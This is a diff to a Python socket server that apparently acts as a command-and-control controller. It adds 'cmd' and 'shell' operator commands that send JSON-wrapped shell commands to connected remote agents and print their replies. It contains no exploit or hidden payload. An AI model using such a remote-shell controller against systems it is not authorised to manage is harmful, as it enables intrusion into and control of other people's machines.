@@ -2,6 +2,7 @@
 import socket
 import time
 import ipaddress
+import json
 from sys import exit
 
 #Import of any in house modules
@@ -117,7 +118,7 @@ def startServer():
     while connectedSuccessfully:
       #Continuously gather user input
       cmd = input(f"[{agentDetails[0]} : {agentDetails[1]}]> ")
-      
+      print(cmd)
       #Check input against functionality and run a particular process
       #if exit is input, command loop will break and user can reconnect
 
@@ -135,6 +136,30 @@ def startServer():
         print(client_response)
       elif cmd == "json":
         sendSocketData(agentSocket, "JSON")
+        time.sleep(2)
+        client_response = receiveSocketData(agentSocket)
+        print(client_response)
+      elif cmd.startswith("cmd"):
+        command = cmd.find(' ')+1
+        left, right = cmd[:command], cmd[command:]
+        x = {
+            "TYPE": "command",
+            "ATTRIBUTE": right
+        }
+        sendCommand = ''.join("CMD\n" + json.dumps(x))
+        sendSocketData(agentSocket, sendCommand) # add command
+        time.sleep(2)
+        client_response = receiveSocketData(agentSocket)
+        print(client_response)
+      elif cmd.startswith("shell"):
+        command = cmd.find(' ')+1
+        left, right = cmd[:command], cmd[command:]
+        x = {
+            "TYPE": "shell",
+            "ATTRIBUTE": right
+        }
+        sendCommand = ''.join("SHELL\n" + json.dumps(x))
+        sendSocketData(agentSocket, sendCommand) # add command
         time.sleep(2)
         client_response = receiveSocketData(agentSocket)
         print(client_response)
